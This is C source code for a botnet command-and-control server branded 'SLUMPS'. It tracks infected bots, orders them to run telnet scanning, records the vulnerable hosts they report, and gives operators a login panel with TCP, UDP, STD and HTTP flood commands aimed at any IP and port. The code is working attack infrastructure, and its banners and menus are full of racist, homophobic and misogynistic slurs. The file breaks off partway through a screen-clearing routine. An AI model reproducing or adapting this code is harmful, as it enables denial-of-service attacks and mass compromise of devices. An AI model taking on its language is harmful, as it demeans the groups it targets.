/*
  _________.____     ____ ___  _____ __________  _________
 /   _____/|    |   |    |   \/     \\______   \/   _____/
 \_____  \ |    |   |    |   /  \ /  \|     ___/\_____  \ 
 /        \|    |___|    |  /    Y    \    |    /        \
/_______  /|_______ \______/\____|__  /____|   /_______  /
        \/         \/               \/                 \/ 
		
Here's a Few Color Codes If you Would Like To Change The Color 

Blue = '\x1b[0;34m'
Brown = '\x1b[0;33m'
Cyan = '\x1b[0;36m' 
DarkGray = '\x1b[1;30m' 
Green = '\x1b[0;32m' 
LightBlue = '\x1b[1;34m' 
LightCyan = '\x1b[1;36m' 
LightGray = '\x1b[0;37m' 
LightGreen = '\x1b[1;32m' 
LightPurple = '\x1b[1;35m' 
LightRed = '\x1b[1;31m' 
Normal = '\x1b[0m' 
Purple = '\x1b[0;35m' 
Red = '\x1b[0;31m' 
White = '\x1b[1;37m' 
Yellow = '\x1b[1;33m

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>

#define MAXFDS 1000000

struct account {
    char id[20]; 
    char password[20];
};
static struct account accounts[50]; //max users is set on 50 you can edit that to whatever 
struct clientdata_t {
        uint32_t ip;
        char build[7];
        char connected;
} clients[MAXFDS];
struct telnetdata_t {
        int connected;
} managements[MAXFDS];
////////////////////////////////////
static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;
////////////////////////////////////
int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}
void trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd)
{
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;
        s = fcntl (sfd, F_SETFL, flags); 
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}
static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_PASSIVE;
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break;
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "Fuck Boy Change The Port You idiot\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[31m", 5, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                printf("sent to fd: %d\n", i);
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[31m~> \x1b[31m", 13, MSG_NOSIGNAL);
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *epollEventLoop(void *useless)
{
        struct epoll_event event;
        struct epoll_event *events;
        int s;
        events = calloc (MAXFDS, sizeof event);
        while (1)
        {
                int n, i;
                n = epoll_wait (epollFD, events, MAXFDS, -1);
                for (i = 0; i < n; i++)
                {
                        if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
                        {
                                clients[events[i].data.fd].connected = 0;
                                close(events[i].data.fd);
                                continue;
                        }
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        struct sockaddr in_addr;
                                        socklen_t in_len;
                                        int infd, ipIndex;
                                        in_len = sizeof in_addr;
                                        infd = accept (listenFD, &in_addr, &in_len);
                                        if (infd == -1)
                                        {
                                                if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                                                else
                                                {
                                                        perror ("accept");
                                                        break;
                                                }
                                        }
                                        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
                                        int dup = 0;
                                        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
                                        {
                                                if(!clients[ipIndex].connected || ipIndex == infd) continue;
                                           //WE ARE MAKING SURE THERE IS NO DUP CLIENTS
                                                if(clients[ipIndex].ip == clients[infd].ip)
                                                {
                                                        dup = 1;
                                                        break;
                                                }
                                        }
 
                                        if(dup) 
                                        {                  //WE ARE MAKE SURE AGAIN HERE BY SENDING !* LOLNOGTFO|!* GTFOFAG
									            if(send(infd, "!* GTFONIGGER\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
											    if(send(infd, "!* GTFOFAG\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
												if(send(infd, "!* GTFODUP\n\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
												if(send(infd, "!* DUPES\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
												if(send(infd, "!* GTFOPUSSY\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
												if(send(infd, "!* LOLNOGTFO\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                                                close(infd);
                                                continue;
                                        }
 
                                        s = make_socket_non_blocking (infd);
                                        if (s == -1) { close(infd); break; }
 
                                        event.data.fd = infd;
                                        event.events = EPOLLIN | EPOLLET;
                                        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                                        if (s == -1)
                                        {
                                                perror ("epoll_ctl");
                                                close(infd);
                                                break;
                                        }
 
                                        clients[infd].connected = 1;
                                        send(infd, "!* SCANNER ON\n", 14, MSG_NOSIGNAL);
										send(infd, "!* FATCOCK\n", 11, MSG_NOSIGNAL);
										
                                }
                                continue;
                        }
                        else
                        {
                                int thefd = events[i].data.fd;
                                struct clientdata_t *client = &(clients[thefd]);
                                int done = 0;
                                client->connected = 1;
                                while (1)
                                {
                                        ssize_t count;
                                        char buf[2048];
                                        memset(buf, 0, sizeof buf);
 
                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
                                                if(strstr(buf, "\n") == NULL) { done = 1; break; }
                                                trim(buf);
                                                if(strcmp(buf, "PING") == 0) // basic IRC-like ping/pong challenge/response to see if server is alive
                                                {
                                                if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                        continue;
                                                }
                                                if(strstr(buf, "REPORT ") == buf) // received a report of a vulnerable system from a scan
                                                {
                                                        char *line = strstr(buf, "REPORT ") + 7; 
                                                        fprintf(telFD, "%s\n", line); // let's write it out to disk without checking what it is!
                                                        fflush(telFD);
                                                        TELFound++;
                                                        continue;
                                                }
                                                if(strstr(buf, "PROBING") == buf)
                                                {
                                                        char *line = strstr(buf, "PROBING");
                                                        scannerreport = 1;
                                                        continue;
                                                }
                                                if(strstr(buf, "REMOVING PROBE") == buf)
                                                {
                                                        char *line = strstr(buf, "REMOVING PROBE");
                                                        scannerreport = 0;
                                                        continue;
                                                }
                                                if(strcmp(buf, "PONG") == 0)
                                                {
                                                        continue;
                                                }
 
                                                printf("buf: \"%s\"\n", buf);
                                        }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}
unsigned int clientsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }
 
        return total;
}
void *titleWriter(void *sock) 
{
        int thefd = (int)sock;
        char string[2048];
        while(1)
        {
                memset(string, 0, 2048);
                sprintf(string, "%c]0; [+]Hoes Connected: %d [-] FuckBoys Online: %d[+]%c", '\033', clientsConnected(), managesConnected, '\007');
                if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
 
                sleep(3);
        }
}
int Search_in_File(char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);

    if(find_result == 0)return 0;

    return find_line;
}
 
void *telnetWorker(void *sock)
{
		char usernamez[80];
        int thefd = (int)sock;
		int find_line;
        managesConnected++;
        pthread_t title;
        char counter[2048];
        memset(counter, 0, 2048);
        char buf[2048];
        char* nickstring;
        char* username;
        char* password;
        memset(buf, 0, sizeof buf);
        char botnet[2048];
        memset(botnet, 0, 2048);
    
        FILE *fp;
        int i=0;
        int c;
        fp=fopen("login.txt", "r"); 
        while(!feof(fp)) 
		{
				c=fgetc(fp);
				++i;
        }
        int j=0;
        rewind(fp);
        while(j!=i-1) 
		{
			fscanf(fp, "%s %s", accounts[j].id, accounts[j].password);
			++j;
        }
        
        if(send(thefd, "\x1b[31mNickname: \x1b[30m", 23, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
		sprintf(usernamez, buf);
        nickstring = ("%s", buf);
        find_line = Search_in_File(nickstring);
        if(strcmp(nickstring, accounts[find_line].id) == 0){	
       	if(send(thefd, "\x1b[31m*           VALID CREDENTIALS          *\r\n", 49, MSG_NOSIGNAL) == -1) goto end;	
        if(send(thefd, "\x1b[31mPassword: \x1b[30m", 23, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto fak;
        }
        failed:
        if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[31m***********************************\r\n", 44, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[31m*          GET SLUMPED BITCH      *\r\n", 44, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[31m***********************************\r\n", 43, MSG_NOSIGNAL) == -1) goto end;
		    sleep(5);
        goto end;
        fak:
		
		pthread_create(&title, NULL, &titleWriter, sock);
		char line1 [80];
		char line2 [80];
		char line3 [80];
		char line4 [80];
		char line5 [80];
		char line6 [80];
		char line7 [80];
        char line8 [80];
    
        sprintf(line1, "\x1b[1;32m       #####################################          \r\n");
		sprintf(line2, "\x1b[1;36m       ##          WELCOME TO             ##          \r\n");
		sprintf(line3, "\x1b[1;36m       ##            SLUMPS               ##          \r\n");
		sprintf(line4, "\x1b[1;36m       ##        PRIVATE SERVER           ##          \r\n");
		sprintf(line5, "\x1b[1;36m       ##      I RUN THIS SHIT BITCH      ##          \r\n");
		sprintf(line6, "\x1b[1;36m       #####################################		    \r\n");
		sprintf(line7, "\x1b[31m\r\n");
       	sprintf(line8, "\x1b[1;32m          [+]-\x1b[37mSLUMPS %s PRIVATE SHIT\x1b[1;32m-[+]\r\n", accounts[find_line].id, buf);
		
		if(send(thefd, line1, strlen(line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line2, strlen(line2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line3, strlen(line3), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line4, strlen(line4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line5, strlen(line5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line6, strlen(line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line7, strlen(line7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, line8, strlen(line8), MSG_NOSIGNAL) == -1) goto end;
		while(1) {
		if(send(thefd, "\x1b[0;31m~> \x1b[0;31m", 13, MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
		
        while(fdgets(buf, sizeof buf, thefd) > 0)
        {
        if(strstr(buf, "STATUS")) 
        {
          sprintf(botnet, "[+] Telnet devices: %d [-] Telnet status: %d [+]\r\n", TELFound, scannerreport);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	    }  

	    if(strstr(buf, "BOTS"))
		{  
		sprintf(botnet, "[+] Hoes Connected: %d [-] FuckBoys Online: %d [+]\r\n", clientsConnected(), managesConnected);
	    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		
	    if(strstr(buf, "ABOUT"))
		{  
		sprintf(botnet, "Nigga if you dont pay us the fucking money get kicked off and nulled ~ Poodle - Rtos\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }	 

        if(strstr(buf, "bots"))
		{  
	    sprintf(botnet, "[+] Hoes Connected: %d [-] FuckBoys Online: %d [+]\r\n", clientsConnected(), managesConnected);
	    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }  
	    if(strstr(buf, "!* SCANNER OFF"))
		{  
		sprintf(botnet, "TELNET SCANNER STOPPED\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* TCP"))
		{  
		sprintf(botnet, "Succesfully Sent A TCP FLOOD\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* UDP"))
		{  
		sprintf(botnet, "Succesfully Sent A UDP FLOOD\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* STD"))
		{  
		sprintf(botnet, "Succesfully Sent A STD FLOOD\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* CNC"))
		{  
		sprintf(botnet, "Succesfully Sent A CNC FLOOD\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* HTTP"))
		{  
		sprintf(botnet, "Succesfully Sent A HTTP FLOOD\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
	    if(strstr(buf, "!* SCANNER ON"))
		{  
		sprintf(botnet, "TELNET SCANNER STARTED\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "help")) 
	    {  
		  sprintf(botnet, "\x1b[1;32m[+\x1b[1;36m]Rape Commands----------------------------------\x1b[0;37m\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[1;36m!* TCP [IP] [PORT] [TIME] 32 all 0 1 | TCP FLOOD\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[1;36m!* UDP [IP] [PORT] [TIME] 32 0 1 | UDP FLOOD\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[1;36m!* STD [IP] [PORT] [TIME] | STD FLOOD\r\n"); 
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[1;36m[+]\x1b[1;32mRetard Commands-----------------------------------\x1b[0;37m\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[1;32m!* KILLATTK | KILLS ALL ATTACKS\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[1;32m!* SCANNER TELNET ON | OFF | TURNS ON THE TELNET SCANNER\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
          sprintf(botnet, "\x1b[1;32m[+]\x1b[1;36mHax0r Commands----------------------------------\x1b[0;37m\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[1;36mBOTS | LOOK AT THE FUCKING TOP\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[1;36mCLEAR | CLEARS YOUR SCREEN\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
          sprintf(botnet, "\x1b[1;36mTIME | JUST LOOK AT IT\r\n");
   	      if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		 }
		 
		if(strstr(buf, "HELP")) 
	    {  
		  sprintf(botnet, "\x1b[1;36m[+\x1b[1;32m]Rape Commands----------------------------------\x1b[0;37m\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[1;32m!* TCP [IP] [PORT] [TIME] 32 all 0 1 | TCP FLOOD\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[1;32m!* UDP [IP] [PORT] [TIME] 32 0 1 | UDP FLOOD\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[1;32m!* STD [IP] [PORT] [TIME] | STD FLOOD\r\n"); 
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[1;32m[+]\x1b[1;36mRetard Commands-----------------------------------\x1b[0;37m\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[1;36m!* KILLATTK | KILLS ALL ATTACKS\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[1;36m!* SCANNER TELNET ON | OFF | TURNS ON THE TELNET SCANNER\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
          sprintf(botnet, "\x1b[1;36m[+]\x1b[1;32mHax0r Commands----------------------------------\x1b[0;37m\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[1;32mBOTS | LOOK AT THE FUCKING TOP\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  sprintf(botnet, "\x1b[1;32mCLEAR | CLEARS YOUR SCREEN\r\n");
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
          sprintf(botnet, "\x1b[1;32mTIME | JUST LOOK AT IT\r\n");
   	      if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		}
	    if(strstr(buf, "CLEAR")){

        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line1, strlen(line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line2, strlen(line2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line3, strlen(line3), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line4, strlen(line4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line5, strlen(line5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line6, strlen(line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line7, strlen(line7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, line8, strlen(line8), MSG_NOSIGNAL) == -1) goto end;
		pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
     	}
	    if(strstr(buf, "clear")){
        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line1, strlen(line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line2, strlen(line2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line3, strlen(line3), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line4, strlen(line4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line5, strlen(line5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line6, strlen(line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line7, strlen(line7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, line8,  strlen(line8), MSG_NOSIGNAL) == -1) goto end;
		pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
		}
		if(strstr(buf, "CLEAR_BLUE")){
		   
		char blue1 [80];
		char blue2 [80];
		char blue3 [80];
		char blue4 [80];
		char blue5 [80];
		char blue6 [80];
		char blue7 [80];
        char blue8 [80];
    
        sprintf(blue1, "\x1b[34m       #####################################          \r\n");
		sprintf(blue2, "\x1b[34m       ##          WELCOME TO             ##          \r\n");
		sprintf(blue3, "\x1b[34m       ##            SLUMPS               ##          \r\n");
		sprintf(blue4, "\x1b[34m       ##        PRIVATE SERVER           ##          \r\n");
		sprintf(blue5, "\x1b[34m       ##      I RUN THIS SHIT BITCH      ##          \r\n");
		sprintf(blue6, "\x1b[34m       #####################################		  \r\n");
		sprintf(blue7, "\x1b[34m\r\n");
        sprintf(blue8, "\x1b[37m          [+]-\x1b[34mSLUMPS %s PRIVATE SHIT\x1b[37m-[+]\r\n", accounts[find_line].id, buf);
		
		if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, blue1, strlen(blue1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, blue2, strlen(blue2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, blue3, strlen(blue3), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, blue4, strlen(blue4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, blue5, strlen(blue5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, blue6, strlen(blue6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, blue7, strlen(blue7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, blue8, strlen(blue8), MSG_NOSIGNAL) == -1) goto end;
		while(1) {
		if(send(thefd, "\x1b[0;31m~> \x1b[0;31m", 13, MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
		continue;
     	}
		if(strstr(buf, "CLEAR_PURPLE")){
		   
		char purple1 [80];
		char purple2 [80];
		char purple3 [80];
		char purple4 [80];
		char purple5 [80];
		char purple6 [80];
		char purple7 [80];
        char purple8 [80];
    
       	sprintf(purple1, "\x1b[35m       #####################################       \r\n");
		sprintf(purple2, "\x1b[35m       ##          WELCOME TO             ##       \r\n");
		sprintf(purple3, "\x1b[35m       ##            SLUMPS               ##       \r\n");
		sprintf(purple4, "\x1b[35m       ##        PRIVATE SERVER           ##       \r\n");
		sprintf(purple5, "\x1b[35m       ##      I RUN THIS SHIT BITCH      ##       \r\n");
		sprintf(purple6, "\x1b[35m       #####################################       \r\n");
		sprintf(purple7, "\x1b[35m\r\n");
      	sprintf(purple8, "\x1b[37m           [+]-\x1b[35mSLUMPS %s PRIVATE SHIT\x1b[37m-[+]\r\n", accounts[find_line].id, buf);
		
		if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, purple1, strlen(purple1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, purple2, strlen(purple2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, purple3, strlen(purple3), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, purple4, strlen(purple4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, purple5, strlen(purple5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, purple6, strlen(purple6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, purple7, strlen(purple7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, purple8, strlen(purple8), MSG_NOSIGNAL) == -1) goto end;
		while(1) {
		if(send(thefd, "\x1b[0;31m~> \x1b[0;31m", 13, MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
		continue;
     	}
		if(strstr(buf, "CLEAR_RASTA")){
		   
		char RASTA1 [80];
		char RASTA2 [80];
		char RASTA3 [80];
		char RASTA4 [80];
		char RASTA5 [80];
		char RASTA6 [80];
		char RASTA7 [80];
        char RASTA8 [80];
    
        sprintf(RASTA1, "\x1b[1;31m       #####################################       \r\n");
		sprintf(RASTA2, "\x1b[1;31m       ##          WELCOME TO             ##       \r\n");
		sprintf(RASTA3, "\x1b[1;33m       ##            SLUMPS               ##       \r\n");
		sprintf(RASTA4, "\x1b[1;33m       ##        PRIVATE SERVER           ##       \r\n");
		sprintf(RASTA5, "\x1b[1;32m       ##      I RUN THIS SHIT BITCH      ##       \r\n");
		sprintf(RASTA6, "\x1b[1;32m       #####################################       \r\n");
		sprintf(RASTA7, "\x1b[1;32m\r\n");
        sprintf(RASTA8, "\x1b[1;37m          [+]-\x1b[1;31mSLUMPS %s \x1b[1;33mPRIVATE\x1b[32m SHIT\x1b[1;37m-[+]\r\n", accounts[find_line].id, buf);
		
		if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, RASTA1, strlen(RASTA1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, RASTA2, strlen(RASTA2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, RASTA3, strlen(RASTA3), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, RASTA4, strlen(RASTA4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, RASTA5, strlen(RASTA5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, RASTA6, strlen(RASTA6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, RASTA7, strlen(RASTA7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, RASTA8, strlen(RASTA8), MSG_NOSIGNAL) == -1) goto end;
		while(1) {
		if(send(thefd, "\x1b[0;31m~> \x1b[0;31m", 13, MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
		continue;
     	}
		if(strstr(buf, "CLEAR_WHITE")){
		   
		char WHITE1 [80];
		char WHITE2 [80];
		char WHITE3 [80];
		char WHITE4 [80];
		char WHITE5 [80];
		char WHITE6 [80];
		char WHITE7 [80];
        char WHITE8 [80];
    
       	sprintf(WHITE1, "\x1b[1;37m       #####################################    \r\n");
		sprintf(WHITE2, "\x1b[1;37m       ##          WELCOME TO             ##    \r\n");
		sprintf(WHITE3, "\x1b[1;37m       ##            SLUMPS               ##    \r\n");
		sprintf(WHITE4, "\x1b[1;37m       ##        PRIVATE SERVER           ##    \r\n");
		sprintf(WHITE5, "\x1b[1;37m       ##      I RUN THIS SHIT BITCH      ##    \r\n");
		sprintf(WHITE6, "\x1b[1;37m       #####################################    \r\n");
		sprintf(WHITE7, "\x1b[1;37m\r\n");
        sprintf(WHITE8, "\x1b[37m          [+]-SLUMPS %s PRIVATE SHIT-[+]\r\n", accounts[find_line].id, buf);
		
		if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, WHITE1, strlen(WHITE1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, WHITE2, strlen(WHITE2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, WHITE3, strlen(WHITE3), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, WHITE4, strlen(WHITE4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, WHITE5, strlen(WHITE5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, WHITE6, strlen(WHITE6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, WHITE7, strlen(WHITE7), MSG_NOSIGNAL) == -1) goto end;
